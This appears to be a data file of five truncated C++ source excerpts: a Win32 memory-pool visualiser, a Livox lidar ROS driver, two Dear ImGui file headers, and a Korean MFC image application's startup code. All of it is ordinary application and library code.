    "\ufeff#if defined _M_IX86\n#pragma comment(linker,\"/manifestdependency:\\\"type='win32' name='Microsoft.Windows.Common-Controls' version='6.0.0.0' processorArchitecture='x86' publicKeyToken='6595b64144ccf1df' language='*'\\\"\")\n#elif defined _M_IA64\n#pragma comment(linker,\"/manifestdependency:\\\"type='win32' name='Microsoft.Windows.Common-Controls' version='6.0.0.0' processorArchitecture='ia64' publicKeyToken='6595b64144ccf1df' language='*'\\\"\")\n#elif defined _M_X64\n#pragma comment(linker,\"/manifestdependency:\\\"type='win32' name='Microsoft.Windows.Common-Controls' version='6.0.0.0' processorArchitecture='amd64' publicKeyToken='6595b64144ccf1df' language='*'\\\"\")\n#else\n#pragma comment(linker,\"/manifestdependency:\\\"type='win32' name='Microsoft.Windows.Common-Controls' version='6.0.0.0' processorArchitecture='*' publicKeyToken='6595b64144ccf1df' language='*'\\\"\")\n#endif\n\n\n#include <SDKDDKVer.h>\n#define WIN32_LEAN_AND_MEAN             // \u4ece Windows \u5934\u6587\u4ef6\u4e2d\u6392\u9664\u6781\u5c11\u4f7f\u7528\u7684\u5185\u5bb9\n// Windows \u5934\u6587\u4ef6\n#include <windows.h>\n#include <windowsx.h>\n#include <CommCtrl.h>\n// C \u8fd0\u884c\u65f6\u5934\u6587\u4ef6\n#include <stdlib.h>\n#include <malloc.h>\n#include <memory.h>\n#include <tchar.h>\n#include <future>\n#include \"../CMemoryObjectPool.h\"\n\n\n\n#define ID_INIT_POOL            1000    // \u7ed8\u753b\u5185\u5b58\u6c60\u5206\u914d\u5668\n#define ID_ALLOCATOR            1001    // \u5206\u914d\u4e00\u4e2a\u6210\u5458\n#define ID_ALLOCATOR2           1002    // \u5206\u914d\u4e24\u4e2a\u6210\u5458\n#define ID_FREE                 1003    // \u91ca\u653e\u4e00\u4e2a\u6210\u5458\n\nclass CAllocator : public std::allocator<BYTE>\n{\n    using _Ty = BYTE;\npublic:\n\n    void deallocate(_Ty* const _Ptr, const size_t _Count) {\n        _STL_ASSERT(_Ptr != nullptr || _Count == 0, \"null pointer cannot point to a block of non-zero size\");\n        if (_Ptr)\n            VirtualFree(_Ptr, 0, MEM_RELEASE);\n\n    }\n\n    __declspec(allocator) _Ty* allocate(_CRT_GUARDOVERFLOW const size_t _Count) {\n        static_assert(sizeof(value_type) > 0, \"value_type must be complete before calling allocate.\");\n\n        LPBYTE pStart = (LPBYTE)0x50000;\n        for (int i = 0; i < 100; i++)\n        {\n            // \u6f14\u793a\u7528, \u5c31\u4e0d\u7ba1\u5bf9\u9f50\u7684\u95ee\u9898\u4e86\n            if (void* const block = VirtualAlloc(pStart, _Count, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))\n            {\n                return reinterpret_cast<_Ty*>(block);\n            }\n            pStart += 0x10000;\n        }\n        throw std::bad_alloc();\n        return 0;\n    }\n\n};\n\ntypedef int value_type;\n#if CMEMORYPOOL_ISDEBUG\nstatic kuodafu::CMemoryObjectPool pool;\nstatic kuodafu::CMemoryPoolView pool_view;\n#else\nstatic kuodafu::CMemoryObjectPool<value_type, CAllocator> pool;\nstatic kuodafu::CMemoryPoolView<value_type, CAllocator> pool_view;\n#endif\n\nconst int m_headSize = sizeof(kuodafu::MEMORY_HEAD);\nconst int m_itemSize = sizeof(int);\nconst int m_count = 10;\nstatic HFONT m_hFont;\nstruct ITEM_VALUE\n{\n    value_type* pAddr;  // \u8bb0\u5f55\u5185\u5b58\u6c60\u5206\u914d\u5230\u7684\u6210\u5458\u5730\u5740\n    value_type* pArr;   // \u5982\u679c\u8fd9\u4e2a\u6210\u5458\u662f\u6570\u7ec4, \u90a3\u4e48\u8fd9\u4e2a\u8bb0\u5f55\u6570\u7ec4\u9996\u5730\u5740\n    int count;          // \u5982\u679c\u8fd9\u4e2a\u6210\u5458\u662f\u6570\u7ec4, \u90a3\u4e48\u8fd9\u4e2a\u8bb0\u5f55\u6570\u7ec4\u7684\u6210\u5458\u4e2a\u6570\n    int start;          // \u8d77\u59cb\u7d22\u5f15, \u65b9\u4fbf\u91ca\u653e\u7528\n};\n\nstatic int m_id = ID_INIT_POOL;\nstatic ITEM_VALUE m_data[m_count];        // \u8bb0\u5f55\u5f53\u524d\u5206\u914d\u7684\u5730\u5740\nstatic RECT m_rcBlock[m_count];     // 10\u4e2a\u5185\u5b58\u5757\u7684\u77e9\u5f62\u5c3a\u5bf8, \u53f3\u952e\u83dc\u5355\u9700\u8981\u4f7f\u7528\nstatic int m_index_down = -1;       // \u53f3\u952e\u5f39\u51fa\u83dc\u5355\u65f6\u7684\u7d22\u5f15\nstatic int m_index = -1;            // \u5de6\u952e\u70b9\u51fb\u7684\u7d22\u5f15\n// \u6b64\u4ee3\u7801\u6a21\u5757\u4e2d\u5305\u542b\u7684\u51fd\u6570\u7684\u524d\u5411\u58f0\u660e:\nBOOL                InitInstance(HINSTANCE, int);\nLRESULT CALLBACK    WndProc(HWND, UINT, WPARAM, LPARAM);\nvoid DrawAllocator(HWND hWnd, HDC hdc, const RECT& rc);\n\n\n\nint APIENTRY wWinMain(_In_ HINSTANCE hInstance,\n                     _In_opt_ HINSTANCE hPrevInstance,\n                     _In_ LPWSTR    lpCmdLine,\n                     _In_ int       nCmdShow)\n{\n    UNREFERENCED_PARAMETER(hPrevInstance);\n    UNREFERENCED_PARAMETER(lpCmdLine);\n\n    pool.init(m_count);\n    pool_view.init(&pool);\n\n    // \u6267\u884c\u5e94\u7528\u7a0b\u5e8f\u521d\u59cb\u5316:\n    if (!InitInstance (hInstance, nCmdShow))\n    {\n        return FALSE;\n    }\n\n    MSG msg;\n\n    // \u4e3b\u6d88\u606f\u5faa\u73af:\n    while (GetMessageW(&msg, nullptr, 0, 0))\n    {\n        TranslateMessage(&msg);\n        DispatchMessageW(&msg);\n    }\n\n    return (int) msg.wParam;\n}\n\n\n//\n//   \u51fd\u6570: InitInstance(HINSTANCE, int)\n//\n//   \u76ee\u6807: \u4fdd\u5b58\u5b9e\u4f8b\u53e5\u67c4\u5e76\u521b\u5efa\u4e3b\u7a97\u53e3\n//\n//   \u6ce8\u91ca:\n//\n//        \u5728\u6b64\u51fd\u6570\u4e2d\uff0c\u6211\u4eec\u5728\u5168\u5c40\u53d8\u91cf\u4e2d\u4fdd\u5b58\u5b9e\u4f8b\u53e5\u67c4\u5e76\n//        \u521b\u5efa\u548c\u663e\u793a\u4e3b\u7a0b\u5e8f\u7a97\u53e3\u3002\n//\nBOOL InitInstance(HINSTANCE hInstance, int nCmdShow)\n{\n    WNDCLASSEXW wcex;\n\n    wcex.cbSize = sizeof(WNDCLASSEX);\n\n    wcex.style          = CS_HREDRAW | CS_VREDRAW;\n    wcex.lpfnWndProc    = WndProc;\n    wcex.cbClsExtra     = 0;\n    wcex.cbWndExtra     = 0;\n    wcex.hInstance      = hInstance;\n    wcex.hIcon          = LoadIconW(nullptr, IDI_APPLICATION);\n    wcex.hCursor        = LoadCursorW(nullptr, IDC_ARROW);\n    wcex.hbrBackground  = (HBRUSH)(COLOR_WINDOW+1);\n    wcex.lpszMenuName   = 0;\n    wcex.lpszClassName  = L\"\u6269\u5927\u798f\u5185\u5b58\u6c60 - \u89c6\u56fe\";\n    wcex.hIconSm        = wcex.hIcon;\n\n    RegisterClassExW(&wcex);\n    HWND hWnd = CreateWindowW(wcex.lpszClassName, L\"\u6269\u5927\u798f\u5185\u5b58\u6c60 - \u53ef\u89c6\u5316\u89c6\u56fe\", WS_OVERLAPPEDWINDOW | WS_CLIPCHILDREN,\n      CW_USEDEFAULT, 0, CW_USEDEFAULT, 0, nullptr, nullptr, hInstance, nullptr);\n\n    if (!hWnd)\n    {\n        return FALSE;\n    }\n\n    ShowWindow(hWnd, nCmdShow);\n    Updat",
    "//\r\n// The MIT License (MIT)\r\n//\r\n// Copyright (c) 2019 Livox. All rights reserved.\r\n//\r\n// Permission is hereby granted, free of charge, to any person obtaining a copy\r\n// of this software and associated documentation files (the \"Software\"), to deal\r\n// in the Software without restriction, including without limitation the rights\r\n// to use, copy, modify, merge, publish, distribute, sublicense, and/or sell\r\n// copies of the Software, and to permit persons to whom the Software is\r\n// furnished to do so, subject to the following conditions:\r\n//\r\n// The above copyright notice and this permission notice shall be included in\r\n// all copies or substantial portions of the Software.\r\n//\r\n// THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\r\n// IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\r\n// FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\r\n// AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\r\n// LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\r\n// OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\r\n// SOFTWARE.\r\n//\r\n\r\n#include \"lds_lidar.h\"\r\n\r\n#include <stdio.h>\r\n#include <string.h>\r\n#include <memory>\r\n#include <mutex>\r\n#include <thread>\r\n\r\n#include \"rapidjson/document.h\"\r\n#include \"rapidjson/filereadstream.h\"\r\n#include \"rapidjson/stringbuffer.h\"\r\n\r\nusing namespace std;\r\n\r\nnamespace livox_ros {\r\n\r\n/** Const varible ------------------------------------------------------------*/\r\n/** For callback use only */\r\nLdsLidar *g_lds_ldiar = nullptr;\r\n\r\n/** Global function for common use -------------------------------------------*/\r\n\r\n/** Lds lidar function -------------------------------------------------------*/\r\nLdsLidar::LdsLidar(uint32_t interval_ms) : Lds(interval_ms, kSourceRawLidar) {\r\n  auto_connect_mode_ = true;\r\n  is_initialized_ = false;\r\n\r\n  whitelist_count_ = 0;\r\n  memset(broadcast_code_whitelist_, 0, sizeof(broadcast_code_whitelist_));\r\n\r\n  ResetLdsLidar();\r\n}\r\n\r\nLdsLidar::~LdsLidar() {}\r\n\r\nvoid LdsLidar::ResetLdsLidar(void) { ResetLds(kSourceRawLidar); }\r\n\r\nint LdsLidar::InitLdsLidar(std::vector<std::string> &broadcast_code_strs,\r\n                           const char *user_config_path) {\r\n  if (is_initialized_) {\r\n    printf(\"LiDAR data source is already inited!\\n\");\r\n    return -1;\r\n  }\r\n\r\n  if (!Init()) {\r\n    Uninit();\r\n    printf(\"Livox-SDK init fail!\\n\");\r\n    return -1;\r\n  }\r\n\r\n  LivoxSdkVersion _sdkversion;\r\n  GetLivoxSdkVersion(&_sdkversion);\r\n  printf(\"Livox SDK version %d.%d.%d\\n\", _sdkversion.major, _sdkversion.minor,\r\n         _sdkversion.patch);\r\n\r\n  SetBroadcastCallback(OnDeviceBroadcast);\r\n  SetDeviceStateUpdateCallback(OnDeviceChange);\r\n\r\n  /** Add commandline input broadcast code */\r\n  for (auto input_str : broadcast_code_strs) {\r\n    AddBroadcastCodeToWhitelist(input_str.c_str());\r\n  }\r\n\r\n  ParseConfigFile(user_config_path);\r\n\r\n  if (whitelist_count_) {\r\n    DisableAutoConnectMode();\r\n    printf(\"Disable auto connect mode!\\n\");\r\n\r\n    printf(\"List all broadcast code in whiltelist:\\n\");\r\n    for (uint32_t i = 0; i < whitelist_count_; i++) {\r\n      printf(\"%s\\n\", broadcast_code_whitelist_[i]);\r\n    }\r\n  } else {\r\n    EnableAutoConnectMode();\r\n    printf(\r\n        \"No broadcast code was added to whitelist, swith to automatic \"\r\n        \"connection mode!\\n\");\r\n  }\r\n\r\n  if (enable_timesync_) {\r\n    timesync_ = TimeSync::GetInstance();\r\n    if (timesync_->InitTimeSync(timesync_config_)) {\r\n      printf(\"Timesync init fail\\n\");\r\n      return -1;\r\n    }\r\n\r\n    if (timesync_->SetReceiveSyncTimeCb(ReceiveSyncTimeCallback, this)) {\r\n      printf(\"Set Timesync callback fail\\n\");\r\n      return -1;\r\n    }\r\n\r\n    timesync_->StartTimesync();\r\n  }\r\n\r\n  /** Start livox sdk to receive lidar data */\r\n  if (!Start()) {\r\n    Uninit();\r\n    printf(\"Livox-SDK init fail!\\n\");\r\n    return -1;\r\n  }\r\n\r\n  /** Add here, only for callback use */\r\n  if (g_lds_ldiar == nullptr) {\r\n    g_lds_ldiar = this;\r\n  }\r\n  is_initialized_ = true;\r\n  printf(\"Livox-SDK init success!\\n\");\r\n\r\n  return 0;\r\n}\r\n\r\nint LdsLidar::DeInitLdsLidar(void) {\r\n  if (!is_initialized_) {\r\n    printf(\"LiDAR data source is not exit\");\r\n    return -1;\r\n  }\r\n\r\n  Uninit();\r\n  printf(\"Livox SDK Deinit completely!\\n\");\r\n\r\n  if (timesync_) {\r\n    timesync_->DeInitTimeSync();\r\n  }\r\n\r\n  return 0;\r\n}\r\n\r\nvoid LdsLidar::PrepareExit(void) { DeInitLdsLidar(); }\r\n\r\n/** Static function in LdsLidar for callback or event process ----------------*/\r\n\r\n/** Receiving point cloud data from Livox LiDAR. */\r\nvoid LdsLidar::OnLidarDataCb(uint8_t handle, LivoxEthPacket *data,\r\n                             uint32_t data_num, void *client_data) {\r\n  using namespace std;\r\n\r\n  LdsLidar *lds_lidar = static_cast<LdsLidar *>(client_data);\r\n  LivoxEthPacket *eth_packet = data;\r\n\r\n  if (!data || !data_num || (handle >= kMaxLidarCount)) {\r\n    return;\r\n  }\r\n\r\n  lds_lidar->StorageRawPacket(handle, eth_packet);\r\n}\r\n\r\nvoid LdsLidar::OnD",
    "// dear imgui, v1.90.4\n// (demo code)\n\n// Help:\n// - Read FAQ at http://dearimgui.com/faq\n// - Call and read ImGui::ShowDemoWindow() in imgui_demo.cpp. All applications in examples/ are doing that.\n// - Need help integrating Dear ImGui in your codebase?\n//   - Read Getting Started https://github.com/ocornut/imgui/wiki/Getting-Started\n//   - Read 'Programmer guide' in imgui.cpp for notes on how to setup Dear ImGui in your codebase.\n// Read imgui.cpp for more details, documentation and comments.\n// Get the latest version at https://github.com/ocornut/imgui\n\n//---------------------------------------------------\n// PLEASE DO NOT REMOVE THIS FILE FROM YOUR PROJECT!\n//---------------------------------------------------\n// Message to the person tempted to delete this file when integrating Dear ImGui into their codebase:\n// Think again! It is the most useful reference code that you and other coders will want to refer to and call.\n// Have the ImGui::ShowDemoWindow() function wired in an always-available debug menu of your game/app!\n// Also include Metrics! ItemPicker! DebugLog! and other debug features.\n// Removing this file from your project is hindering access to documentation for everyone in your team,\n// likely leading you to poorer usage of the library.\n// Everything in this file will be stripped out by the linker if you don't call ImGui::ShowDemoWindow().\n// If you want to link core Dear ImGui in your shipped builds but want a thorough guarantee that the demo will not be\n// linked, you can setup your imconfig.h with #define IMGUI_DISABLE_DEMO_WINDOWS and those functions will be empty.\n// In another situation, whenever you have Dear ImGui available you probably want this to be available for reference.\n// Thank you,\n// -Your beloved friend, imgui_demo.cpp (which you won't delete)\n\n//--------------------------------------------\n// ABOUT THE MEANING OF THE 'static' KEYWORD:\n//--------------------------------------------\n// In this demo code, we frequently use 'static' variables inside functions.\n// A static variable persists across calls. It is essentially a global variable but declared inside the scope of the function.\n// Think of \"static int n = 0;\" as \"global int n = 0;\" !\n// We do this IN THE DEMO because we want:\n// - to gather code and data in the same place.\n// - to make the demo source code faster to read, faster to change, smaller in size.\n// - it is also a convenient way of storing simple UI related information as long as your function\n//   doesn't need to be reentrant or used in multiple threads.\n// This might be a pattern you will want to use in your code, but most of the data you would be working\n// with in a complex codebase is likely going to be stored outside your functions.\n\n//-----------------------------------------\n// ABOUT THE CODING STYLE OF OUR DEMO CODE\n//-----------------------------------------\n// The Demo code in this file is designed to be easy to copy-and-paste into your application!\n// Because of this:\n// - We never omit the ImGui:: prefix when calling functions, even though most code here is in the same namespace.\n// - We try to declare static variables in the local scope, as close as possible to the code using them.\n// - We never use any of the helpers/facilities used internally by Dear ImGui, unless available in the public API.\n// - We never use maths operators on ImVec2/ImVec4. For our other sources files we use them, and they are provided\n//   by imgui.h using the IMGUI_DEFINE_MATH_OPERATORS define. For your own sources file they are optional\n//   and require you either enable those, either provide your own via IM_VEC2_CLASS_EXTRA in imconfig.h.\n//   Because we can't assume anything about your support of maths operators, we cannot use them in imgui_demo.cpp.\n\n// Navigating this file:\n// - In Visual Studio: CTRL+comma (\"Edit.GoToAll\") can follow symbols in comments, whereas CTRL+F12 (\"Edit.GoToImplementation\") cannot.\n// - With Visual Assist installed: ALT+G (\"VAssistX.GoToImplementation\") can also follow symbols in comments.\n\n/*\n\nIndex of this file:\n\n// [SECTION] Forward Declarations\n// [SECTION] Helpers\n// [SECTION] Demo Window / ShowDemoWindow()\n// - ShowDemoWindow()\n// - sub section: ShowDemoWindowWidgets()\n// - sub section: ShowDemoWindowLayout()\n// - sub section: ShowDemoWindowPopups()\n// - sub section: ShowDemoWindowTables()\n// - sub section: ShowDemoWindowInputs()\n// [SECTION] About Window / ShowAboutWindow()\n// [SECTION] Style Editor / ShowStyleEditor()\n// [SECTION] User Guide / ShowUserGuide()\n// [SECTION] Example App: Main Menu Bar / ShowExampleAppMainMenuBar()\n// [SECTION] Example App: Debug Console / ShowExampleAppConsole()\n// [SECTION] Example App: Debug Log / ShowExampleAppLog()\n// [SECTION] Example App: Simple Layout / ShowExampleAppLayout()\n// [SECTION] Example App: Property Editor / ShowExampleAppPropertyEditor()\n// [SECTION] Example App: Long Text / ShowExampleAppLongText()\n// [SECTION] Example App: Auto Resize / ShowExampleAppAutoResize()\n// [SECTION] Example A",
    "// dear imgui, v1.78\n// (main code and documentation)\n\n// Help:\n// - Read FAQ at http://dearimgui.org/faq\n// - Newcomers, read 'Programmer guide' below for notes on how to setup Dear ImGui in your codebase.\n// - Call and read ImGui::ShowDemoWindow() in imgui_demo.cpp. All applications in examples/ are doing that.\n// Read imgui.cpp for details, links and comments.\n\n// Resources:\n// - FAQ                   http://dearimgui.org/faq\n// - Homepage & latest     https://github.com/ocornut/imgui\n// - Releases & changelog  https://github.com/ocornut/imgui/releases\n// - Gallery               https://github.com/ocornut/imgui/issues/3075 (please post your screenshots/video there!)\n// - Glossary              https://github.com/ocornut/imgui/wiki/Glossary\n// - Wiki                  https://github.com/ocornut/imgui/wiki\n// - Issues & support      https://github.com/ocornut/imgui/issues\n\n// Developed by Omar Cornut and every direct or indirect contributors to the GitHub.\n// See LICENSE.txt for copyright and licensing details (standard MIT License).\n// This library is free but needs your support to sustain development and maintenance.\n// Businesses: you can support continued development via invoiced technical support, maintenance and sponsoring contracts. Please reach out to \"contact AT dearimgui.org\".\n// Individuals: you can support continued development via donations. See docs/README or web page.\n\n// It is recommended that you don't modify imgui.cpp! It will become difficult for you to update the library.\n// Note that 'ImGui::' being a namespace, you can add functions into the namespace from your own source files, without\n// modifying imgui.h or imgui.cpp. You may include imgui_internal.h to access internal data structures, but it doesn't\n// come with any guarantee of forward compatibility. Discussing your changes on the GitHub Issue Tracker may lead you\n// to a better solution or official support for them.\n\n/*\n\nIndex of this file:\n\nDOCUMENTATION\n\n- MISSION STATEMENT\n- END-USER GUIDE\n- PROGRAMMER GUIDE\n  - READ FIRST\n  - HOW TO UPDATE TO A NEWER VERSION OF DEAR IMGUI\n  - GETTING STARTED WITH INTEGRATING DEAR IMGUI IN YOUR CODE/ENGINE\n  - HOW A SIMPLE APPLICATION MAY LOOK LIKE\n  - HOW A SIMPLE RENDERING FUNCTION MAY LOOK LIKE\n  - USING GAMEPAD/KEYBOARD NAVIGATION CONTROLS\n- API BREAKING CHANGES (read me when you update!)\n- FREQUENTLY ASKED QUESTIONS (FAQ)\n  - Read all answers online: https://www.dearimgui.org/faq, or in docs/FAQ.md (with a Markdown viewer)\n\nCODE\n(search for \"[SECTION]\" in the code to find them)\n\n// [SECTION] INCLUDES\n// [SECTION] FORWARD DECLARATIONS\n// [SECTION] CONTEXT AND MEMORY ALLOCATORS\n// [SECTION] USER FACING STRUCTURES (ImGuiStyle, ImGuiIO)\n// [SECTION] MISC HELPERS/UTILITIES (Geometry functions)\n// [SECTION] MISC HELPERS/UTILITIES (String, Format, Hash functions)\n// [SECTION] MISC HELPERS/UTILITIES (File functions)\n// [SECTION] MISC HELPERS/UTILITIES (ImText* functions)\n// [SECTION] MISC HELPERS/UTILITIES (Color functions)\n// [SECTION] ImGuiStorage\n// [SECTION] ImGuiTextFilter\n// [SECTION] ImGuiTextBuffer\n// [SECTION] ImGuiListClipper\n// [SECTION] STYLING\n// [SECTION] RENDER HELPERS\n// [SECTION] MAIN CODE (most of the code! lots of stuff, needs tidying up!)\n// [SECTION] ERROR CHECKING\n// [SECTION] LAYOUT\n// [SECTION] SCROLLING\n// [SECTION] TOOLTIPS\n// [SECTION] POPUPS\n// [SECTION] KEYBOARD/GAMEPAD NAVIGATION\n// [SECTION] DRAG AND DROP\n// [SECTION] LOGGING/CAPTURING\n// [SECTION] SETTINGS\n// [SECTION] PLATFORM DEPENDENT HELPERS\n// [SECTION] METRICS/DEBUG WINDOW\n\n*/\n\n//-----------------------------------------------------------------------------\n// DOCUMENTATION\n//-----------------------------------------------------------------------------\n\n/*\n\n MISSION STATEMENT\n =================\n\n - Easy to use to create code-driven and data-driven tools.\n - Easy to use to create ad hoc short-lived tools and long-lived, more elaborate tools.\n - Easy to hack and improve.\n - Minimize screen real-estate usage.\n - Minimize setup and maintenance.\n - Minimize state storage on user side.\n - Portable, minimize dependencies, run on target (consoles, phones, etc.).\n - Efficient runtime and memory consumption (NB- we do allocate when \"growing\" content e.g. creating a window,.\n   opening a tree node for the first time, etc. but a typical frame should not allocate anything).\n\n Designed for developers and content-creators, not the typical end-user! Some of the weaknesses includes:\n - Doesn't look fancy, doesn't animate.\n - Limited layout features, intricate layouts are typically crafted in code.\n\n\n END-USER GUIDE\n ==============\n\n - Double-click on title bar to collapse window.\n - Click upper right corner to close a window, available when 'bool* p_open' is passed to ImGui::Begin().\n - Click and drag on lower right corner to resize window (double-click to auto fit window to its contents).\n - Click and drag on any empty space to move window.\n - TAB/SHIFT+TAB to cycle through keyboard editable fields.\n - CTRL+Click on a slider o",
    "\ufeff\r\n// ColorImageAlpha1.cpp: \uc560\ud50c\ub9ac\ucf00\uc774\uc158\uc5d0 \ub300\ud55c \ud074\ub798\uc2a4 \ub3d9\uc791\uc744 \uc815\uc758\ud569\ub2c8\ub2e4.\r\n//\r\n\r\n#include \"pch.h\"\r\n#include \"framework.h\"\r\n#include \"afxwinappex.h\"\r\n#include \"afxdialogex.h\"\r\n#include \"ColorImageAlpha1.h\"\r\n#include \"MainFrm.h\"\r\n\r\n#include \"ColorImageAlpha1Doc.h\"\r\n#include \"ColorImageAlpha1View.h\"\r\n\r\n#ifdef _DEBUG\r\n#define new DEBUG_NEW\r\n#endif\r\n\r\n\r\n// CColorImageAlpha1App\r\n\r\nBEGIN_MESSAGE_MAP(CColorImageAlpha1App, CWinApp)\r\n\tON_COMMAND(ID_APP_ABOUT, &CColorImageAlpha1App::OnAppAbout)\r\n\t// \ud45c\uc900 \ud30c\uc77c\uc744 \uae30\ucd08\ub85c \ud558\ub294 \ubb38\uc11c \uba85\ub839\uc785\ub2c8\ub2e4.\r\n\tON_COMMAND(ID_FILE_NEW, &CWinApp::OnFileNew)\r\n\tON_COMMAND(ID_FILE_OPEN, &CWinApp::OnFileOpen)\r\n\t// \ud45c\uc900 \uc778\uc1c4 \uc124\uc815 \uba85\ub839\uc785\ub2c8\ub2e4.\r\n\tON_COMMAND(ID_FILE_PRINT_SETUP, &CWinApp::OnFilePrintSetup)\r\nEND_MESSAGE_MAP()\r\n\r\n\r\n// CColorImageAlpha1App \uc0dd\uc131\r\n\r\nCColorImageAlpha1App::CColorImageAlpha1App() noexcept\r\n{\r\n\r\n\t// \ub2e4\uc2dc \uc2dc\uc791 \uad00\ub9ac\uc790 \uc9c0\uc6d0\r\n\tm_dwRestartManagerSupportFlags = AFX_RESTART_MANAGER_SUPPORT_ALL_ASPECTS;\r\n#ifdef _MANAGED\r\n\t// \uc560\ud50c\ub9ac\ucf00\uc774\uc158\uc744 \uacf5\uc6a9 \uc5b8\uc5b4 \ub7f0\ud0c0\uc784 \uc9c0\uc6d0\uc744 \uc0ac\uc6a9\ud558\uc5ec \ube4c\ub4dc\ud55c \uacbd\uc6b0(/clr):\r\n\t//     1) \uc774 \ucd94\uac00 \uc124\uc815\uc740 \ub2e4\uc2dc \uc2dc\uc791 \uad00\ub9ac\uc790 \uc9c0\uc6d0\uc774 \uc81c\ub300\ub85c \uc791\ub3d9\ud558\ub294 \ub370 \ud544\uc694\ud569\ub2c8\ub2e4.\r\n\t//     2) \ud504\ub85c\uc81d\ud2b8\uc5d0\uc11c \ube4c\ub4dc\ud558\ub824\uba74 System.Windows.Forms\uc5d0 \ub300\ud55c \ucc38\uc870\ub97c \ucd94\uac00\ud574\uc57c \ud569\ub2c8\ub2e4.\r\n\tSystem::Windows::Forms::Application::SetUnhandledExceptionMode(System::Windows::Forms::UnhandledExceptionMode::ThrowException);\r\n#endif\r\n\r\n\t// TODO: \uc544\ub798 \uc560\ud50c\ub9ac\ucf00\uc774\uc158 ID \ubb38\uc790\uc5f4\uc744 \uace0\uc720 ID \ubb38\uc790\uc5f4\ub85c \ubc14\uafb8\uc2ed\uc2dc\uc624(\uad8c\uc7a5).\r\n\t// \ubb38\uc790\uc5f4\uc5d0 \ub300\ud55c \uc11c\uc2dd: CompanyName.ProductName.SubProduct.VersionInformation\r\n\tSetAppID(_T(\"ColorImageAlpha1.AppID.NoVersion\"));\r\n\r\n\t// TODO: \uc5ec\uae30\uc5d0 \uc0dd\uc131 \ucf54\ub4dc\ub97c \ucd94\uac00\ud569\ub2c8\ub2e4.\r\n\t// InitInstance\uc5d0 \ubaa8\ub4e0 \uc911\uc694\ud55c \ucd08\uae30\ud654 \uc791\uc5c5\uc744 \ubc30\uce58\ud569\ub2c8\ub2e4.\r\n}\r\n\r\n// \uc720\uc77c\ud55c CColorImageAlpha1App \uac1c\uccb4\uc785\ub2c8\ub2e4.\r\n\r\nCColorImageAlpha1App theApp;\r\n\r\n\r\n// CColorImageAlpha1App \ucd08\uae30\ud654\r\n\r\nBOOL CColorImageAlpha1App::InitInstance()\r\n{\r\n\t// \uc560\ud50c\ub9ac\ucf00\uc774\uc158 \ub9e4\ub2c8\ud398\uc2a4\ud2b8\uac00 ComCtl32.dll \ubc84\uc804 6 \uc774\uc0c1\uc744 \uc0ac\uc6a9\ud558\uc5ec \ube44\uc8fc\uc5bc \uc2a4\ud0c0\uc77c\uc744\r\n\t// \uc0ac\uc6a9\ud558\ub3c4\ub85d \uc9c0\uc815\ud558\ub294 \uacbd\uc6b0, Windows XP \uc0c1\uc5d0\uc11c \ubc18\ub4dc\uc2dc InitCommonControlsEx()\uac00 \ud544\uc694\ud569\ub2c8\ub2e4. \r\n\t// InitCommonControlsEx()\ub97c \uc0ac\uc6a9\ud558\uc9c0 \uc54a\uc73c\uba74 \ucc3d\uc744 \ub9cc\ub4e4 \uc218 \uc5c6\uc2b5\ub2c8\ub2e4.\r\n\tINITCOMMONCONTROLSEX InitCtrls;\r\n\tInitCtrls.dwSize = sizeof(InitCtrls);\r\n\t// \uc751\uc6a9 \ud504\ub85c\uadf8\ub7a8\uc5d0\uc11c \uc0ac\uc6a9\ud560 \ubaa8\ub4e0 \uacf5\uc6a9 \ucee8\ud2b8\ub864 \ud074\ub798\uc2a4\ub97c \ud3ec\ud568\ud558\ub3c4\ub85d\r\n\t// \uc774 \ud56d\ubaa9\uc744 \uc124\uc815\ud558\uc2ed\uc2dc\uc624.\r\n\tInitCtrls.dwICC = ICC_WIN95_CLASSES;\r\n\tInitCommonControlsEx(&InitCtrls);\r\n\r\n\tCWinApp::InitInstance();\r\n\r\n\r\n\t// OLE \ub77c\uc774\ube0c\ub7ec\ub9ac\ub97c \ucd08\uae30\ud654\ud569\ub2c8\ub2e4.\r\n\tif (!AfxOleInit())\r\n\t{\r\n\t\tAfxMessageBox(IDP_OLE_INIT_FAILED);\r\n\t\treturn FALSE;\r\n\t}\r\n\r\n\tAfxEnableControlContainer();\r\n\r\n\tEnableTaskbarInteraction(FALSE);\r\n\r\n\t// RichEdit \ucee8\ud2b8\ub864\uc744 \uc0ac\uc6a9\ud558\ub824\uba74 AfxInitRichEdit2()\uac00 \uc788\uc5b4\uc57c \ud569\ub2c8\ub2e4.\r\n\t// AfxInitRichEdit2();\r\n\r\n\t// \ud45c\uc900 \ucd08\uae30\ud654\r\n\t// \uc774\ub4e4 \uae30\ub2a5\uc744 \uc0ac\uc6a9\ud558\uc9c0 \uc54a\uace0 \ucd5c\uc885 \uc2e4\ud589 \ud30c\uc77c\uc758 \ud06c\uae30\ub97c \uc904\uc774\ub824\uba74\r\n\t// \uc544\ub798\uc5d0\uc11c \ud544\uc694 \uc5c6\ub294 \ud2b9\uc815 \ucd08\uae30\ud654\r\n\t// \ub8e8\ud2f4\uc744 \uc81c\uac70\ud574\uc57c \ud569\ub2c8\ub2e4.\r\n\t// \ud574\ub2f9 \uc124\uc815\uc774 \uc800\uc7a5\ub41c \ub808\uc9c0\uc2a4\ud2b8\ub9ac \ud0a4\ub97c \ubcc0\uacbd\ud558\uc2ed\uc2dc\uc624.\r\n\t// TODO: \uc774 \ubb38\uc790\uc5f4\uc744 \ud68c\uc0ac \ub610\ub294 \uc870\uc9c1\uc758 \uc774\ub984\uacfc \uac19\uc740\r\n\t// \uc801\uc808\ud55c \ub0b4\uc6a9\uc73c\ub85c \uc218\uc815\ud574\uc57c \ud569\ub2c8\ub2e4.\r\n\tSetRegistryKey(_T(\"\ub85c\uceec \uc560\ud50c\ub9ac\ucf00\uc774\uc158 \ub9c8\ubc95\uc0ac\uc5d0\uc11c \uc0dd\uc131\ub41c \uc560\ud50c\ub9ac\ucf00\uc774\uc158\"));\r\n\tLoadStdProfileSettings(4);  // MRU\ub97c 